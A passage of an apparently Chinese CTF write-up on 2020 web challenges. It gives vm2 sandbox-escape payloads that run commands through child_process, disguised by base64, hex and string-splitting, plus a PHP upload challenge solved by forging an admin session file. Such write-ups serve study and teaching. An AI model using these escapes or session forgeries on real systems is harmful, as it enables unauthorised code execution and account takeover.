class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先引号可以用反引号`来绕过，关键字通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173554611.png" alt="image-20200419173554611" style="zoom:200%;">
+
+<p>这样字符串拼接来绕过</p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>c`</span>&#125;</span>Sync`</span>](<span class="string">`whoami`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+
+<p>官方payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="keyword">catch</span>(e)&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>chamd5 <a href="https://mp.weixin.qq.com/s/ih2X8IXVFmrMVwJYuf5gng" target="_blank" rel="noopener">解法</a></p>
+<ul>
+<li>利用base64编码绕过关键字的过滤</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用hex绕过</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>)[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>附上自己编的hex编码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"prototype"</span>)+<span class="string">")"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		result += <span class="string">"\\x"</span></span><br><span class="line">		result += i.encode(<span class="string">"hex"</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"`"</span>+fun(<span class="string">"get_process"</span>)+<span class="string">"`"</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-babyupload"><a href="#0x03-babyupload" class="headerlink" title="0x03 babyupload"></a>0x03 babyupload</h1><p>题目直接给了源码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先开启了session机制，初始设置<code>$_SESSION[&#39;username&#39;]=&#39;guest&#39;</code>如果<code>$_SESSION[&#39;username&#39;] ===&#39;admin&#39;</code>而且<code>/var/babyctf/success.txt</code>这个文件存在，就可以输出flag，然后看接下来的部分，通过direction可以设置上传或下载，有上传和下载的功能，上传需要自己伪造上传表单，文件路径通过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>来拼接，下载文件的文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">$file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br></pre></td></tr></table></figure>
+
+<p>通过他来拼接，$dirpath为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后分析得到解题步骤如下：</p>
+<ol>
+<li>下载sess_xx文件，获取服务端sess保存机制。</li>
+<li>上传文件伪造admin的session，取得伪造后的PHPSESSID，</li>
+<li>通过attr上传success.txt文件夹。</li>
+<li>修改cookie，刷新界面</li>
+</ol>
+<p>首先下载服务器端sess_xx文件</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165506846.png" alt="image-20200419165506846"></p>
+<p>文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;&#x2F;&#x2F;有一个不可见字符为0x08</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>后来得知后端php采用的是php_binary的session保存机制，键名长度对应的asc字符  键名   serialize后的字符串</p>
+</blockquote>
+<p>然后本地搭建环境，修改源码输出文件保存的路径</p>
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165338104.png" alt="image-20200419165338104"></p>
+<p>发包；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;hf&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.35.158</span><br><span class="line">Content-Length: 318</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.35.158</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.35.158&#x2F;hf&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;gijbgl5915bkhhlu6ldn446u3l</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;direction&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;up_file&quot;; filename&#x3D;&quot;sess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line">------WebKitFormBoundary74eU7CTX7U8Fmuv0--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419165647345.png" alt="image-20200419165647345"></p>
+<blockquote>
+<p>这里的文件名也可以以另一种方法获得，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后查看tmp目录，对应得生成得sess文件如下图：</p>
